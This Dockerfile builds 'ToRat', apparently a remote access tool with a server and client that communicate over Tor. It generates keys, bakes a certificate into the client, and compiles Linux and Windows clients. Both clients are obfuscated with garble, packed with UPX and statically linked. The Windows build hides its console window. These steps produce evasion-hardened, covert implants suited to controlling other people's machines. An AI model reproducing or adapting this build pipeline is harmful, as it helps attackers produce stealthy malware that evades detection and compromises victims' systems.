FROM lu4p/tor-static:latest
RUN GO111MODULE=on go get mvdan.cc/garble@c9deff810b6091955c5bd7f43cdd9dc7e4488426
RUN mkdir /ToRat
WORKDIR /ToRat
COPY go.mod .
COPY go.sum .

RUN go mod download -x
RUN GO111MODULE=on go install github.com/lu4p/binclude/cmd/binclude

RUN mkdir -p /dist/server && mkdir -p /dist/client

COPY . .

# Generate keys and certificates
RUN cd ./keygen && go run .

# Include Certificate in the binary
RUN cd ./torat_client && binclude

# Build ToRat_server
RUN cd ./cmd/server && go build -o /dist/server/ToRat_server

ENV GOPRIVATE=github.com,gopkg.in,golang.org,google.golang.org

# Build Linux Client
RUN cd /go/pkg/mod/github.com/cretz/tor-static && tar -xf libs_linux.tar.gz
RUN cd ./cmd/client && garble -literals -tiny -seed=random build -ldflags="-extldflags=-static" -tags "osusergo,netgo,tor" -o /dist/client/client_linux && upx /dist/client/client_linux
# Build Windows Client
RUN cd /go/pkg/mod/github.com/cretz/tor-static && unzip -o tor-static-windows-amd64.zip 
RUN cd ./cmd/client && GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ garble -literals -tiny -seed=random build -tags "osusergo,netgo,tor" --ldflags "-H windowsgui" -o /dist/client/client_windows.exe
RUN upx /dist/client/client_windows.exe --force

CMD cp /dist/* /dist_ext -rf && ls /dist_ext && cd ./cmd/server/ && /dist_ext/server/ToRat_server
